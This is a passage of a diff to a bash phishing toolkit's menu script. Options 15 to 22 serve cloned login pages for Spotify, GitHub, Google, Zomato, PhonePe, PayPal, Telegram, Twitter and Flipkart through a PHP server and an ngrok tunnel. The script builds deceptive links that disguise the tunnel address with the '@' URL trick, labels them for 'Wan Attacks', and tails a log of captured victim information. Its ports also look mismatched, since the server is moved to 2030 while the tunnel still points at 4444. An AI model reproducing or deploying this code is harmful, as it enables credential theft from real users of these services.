-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.spotify.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.spotify.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
-                          echo ""
                           echo ""
                           tail -f log.txt  
-
                 break;
                 elif [ $option = 15 ] || [ $option = 15 ]
-	        then
+            then
                           cd sites/
                           cd github/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://github.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://github.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
-
+                          tail -f log.txt 
                 break;
                 elif [ $option = 16 ] || [ $option = 16 ]
-	        then
+            then
                           cd sites/
                           cd ipfinder/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://google.com-login-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://google.com-login-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                 
-
+                          tail -f log.txt 
                 break;
                 elif [ $option = 17 ] || [ $option = 17 ]
-	        then
+            then
                
                           cd sites/
                           cd Zomato-Phishing/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.zomato.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.zomato.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
-             
-
+                          tail -f log.txt 
                 break;
                 elif [ $option = 18 ] || [ $option = 18 ]
-	        then
-
+            then
                           cd sites/
                           cd phonepay/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WATN TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.phonepe.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.phonepe.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
-                     
-
+                          tail -f log.txt 
                 break;
                 elif [ $option = 19 ] || [ $option = 19 ]
-	        then
+            then
                           cd sites/
                           cd paypal/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.paypal.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://www.paypal.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt                  
-     
+                          tail -f log.txt 
                 break;
                 elif [ $option = 20 ] || [ $option = 20 ]
-	        then
+            then
                           cd sites/
                           cd telegram/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://web.telegram.org-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://web.telegram.org-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt  
+                          tail -f log.txt 
 
                 break;
                 elif [ $option = 21 ] || [ $option = 21 ]
-	        then
+            then
                           cd sites/
                           cd twitter/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Ngrok server now starting...\n"${WHITE}
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 25
-                          clear
+                          sleep 9
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-                          echo ""
-                          echo ""
-                          cat secnhack
-                          echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
-                          echo ""
-                          echo "" 
-                          read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
-                          echo ""
+                          read -p $"${GREEN}[${WHITE}+${GREEN}]${WHITE} Do you want to modify url?${WHITE} [y/n]: " option
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://twitter.com-@$link                                    
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://twitter.com-@$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           else
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                          printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
-                          echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                          printf "\n${GREEN}[${WHITE}+${GREEN}]${RED} Wan Attacks use this link:${ORANGE} %s" https://$link
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Local Attacks use this link:${ORANGE} http://127.0.0.1:2030\n"${WHITE}
                           fi
-                           
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${BLUE} Witing to Crawl victim's information\n"${WHITE}
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
-                          echo ""
-                          tail -f log.txt  
+                          tail -f log.txt
 
                 break;
                 elif [ $option = 22 ] || [ $option = 22 ]
-	        then
+            then
                           cd sites/
                           cd flipcart/
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                          echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Php server now starting...\n"${WHITE}
+                          php -S 0.0.0.0:2030 > /dev/null 2>&1 &
                           sleep 3
-                          echo ""
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                          echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
